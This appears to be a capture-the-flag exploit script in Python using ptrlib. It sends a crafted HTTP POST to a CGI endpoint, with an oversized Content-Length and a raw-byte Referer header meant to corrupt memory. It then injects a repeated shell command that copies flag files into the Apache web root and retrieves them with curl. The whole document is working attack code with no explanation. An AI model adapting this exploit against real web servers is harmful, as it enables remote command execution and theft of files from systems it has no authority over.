from ptrlib import *
from subprocess import getoutput
from time import *

payload = b'''POST /cgi-bin/setting.cgi HTTP/1.1
Host: localhost
Content-Length: 1000000000
Referer: \x21\x21\xa1\xc1\xfe\x8d\x9d

'''

sock = Socket('localhost', 19810)
sock.send(payload.replace(b'\n', b'\r\n'))

sock.send(b'cat /flag* > /usr/local/apache2/htdocs/saodjaisda.txt;'*1011 + b'\n')
sleep(5)

print(getoutput("curl localhost:19810/saodjaisda.txt | hexdump -C"))
